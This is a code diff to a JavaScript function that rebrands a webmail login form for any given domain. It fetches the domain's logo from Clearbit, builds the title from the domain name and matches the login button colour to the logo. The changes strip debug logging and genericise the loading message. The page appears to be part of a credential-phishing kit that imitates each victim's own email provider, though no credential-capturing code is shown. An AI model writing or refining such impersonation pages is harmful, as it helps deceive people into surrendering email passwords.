@@ -707,7 +707,6 @@
         
         // Function to customize the webmail form based on the domain
         function customizeWebmailForm(domain) {
-            console.log('Customizing webmail form for domain:', domain);
             
             // Get domain without subdomain
             const parts = domain.split('.');
@@ -717,7 +716,7 @@
             }
             
             // Update loading message
-            document.getElementById('loading-message').textContent = `Loading ${baseDomain} information...`;
+            document.getElementById('loading-message').textContent = `Loading...`;
             
 // Update form title with domain
 const domainTitle = baseDomain.split('.')[0];
@@ -751,7 +750,6 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
                 // Image loaded successfully
                 loadingMessage.style.display = 'none';
                 logoElement.style.backgroundImage = `url('${clearbitUrl}')`;
-                console.log('Logo loaded from:', clearbitUrl);
                 
                 // Update button color based on image
                 try {
@@ -759,7 +757,6 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
                         document.getElementById('webmail-button').style.backgroundColor = color;
                     });
                 } catch (e) {
-                    console.log('Could not extract color:', e);
                 }
             };
             
@@ -768,7 +765,6 @@ document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).
                 loadingMessage.style.display = 'none';
                 logoElement.style.backgroundImage = 'none';
                 logoElement.innerHTML = `<h1 style="margin:0;padding-top:30px;color:#444;">${domain.split('.')[0].toUpperCase()}</h1>`;
-                console.log('Using text logo for:', domain);
                 
                 // Use a default button color
                 document.getElementById('webmail-button').style.backgroundColor = '#555';
